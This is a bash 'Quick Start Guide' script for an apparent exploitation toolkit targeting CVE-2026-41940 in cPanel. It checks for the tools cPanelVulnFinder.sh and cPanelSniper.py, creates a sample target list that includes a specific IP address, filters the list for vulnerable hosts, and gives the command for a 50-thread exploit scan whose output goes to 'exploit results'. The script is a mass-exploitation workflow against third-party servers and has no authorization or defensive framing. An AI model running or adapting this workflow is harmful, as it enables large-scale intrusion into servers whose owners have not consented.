#!/bin/bash
# Quick Start Guide - CVE-2026-41940 Target Finding & Exploitation

echo "========================================"
echo "CVE-2026-41940 - Quick Start Guide"
echo "========================================"
echo ""

# Check if cPanelVulnFinder exists
if [ ! -f "./cPanelVulnFinder.sh" ]; then
    echo "ERROR: cPanelVulnFinder.sh not found!"
    exit 1
fi

# Check if cPanelSniper exists
if [ ! -f "./cPanelSniper.py" ]; then
    echo "ERROR: cPanelSniper.py not found!"
    exit 1
fi

echo "Step 1: Prepare target list"
echo "----------------------------------------"
echo "Create a file with domains/IPs (one per line):"
echo "  domains.txt format examples:"
echo "  - example.com"
echo "  - 185.93.89.36"
echo "  - https://target.com:2087"
echo ""

if [ ! -f "domains.txt" ]; then
    echo "Example domains.txt created"
    cat > domains.txt << 'EXAMPLE'
example.com
test.org
185.93.89.36
EXAMPLE
fi

echo "Step 2: Filter for potentially vulnerable targets"
echo "----------------------------------------"
./cPanelVulnFinder.sh domains.txt vulnerable_targets.txt
echo ""

echo "Step 3: Scan with cPanelSniper"
echo "----------------------------------------"
echo "python3 cPanelSniper.py -l vulnerable_targets.txt -t 50 -o results.json"
echo ""

echo "========================================"
echo "Quick Start Complete!"
echo "========================================"
echo ""
echo "Files created:"
echo "  - vulnerable_targets.txt (filtered targets)"
echo "  - results.json (exploit results after scan)"
echo ""
echo "For detailed documentation:"
echo "  - cat VULNFINDER_README.md"
echo "  - cat README.md"
echo ""
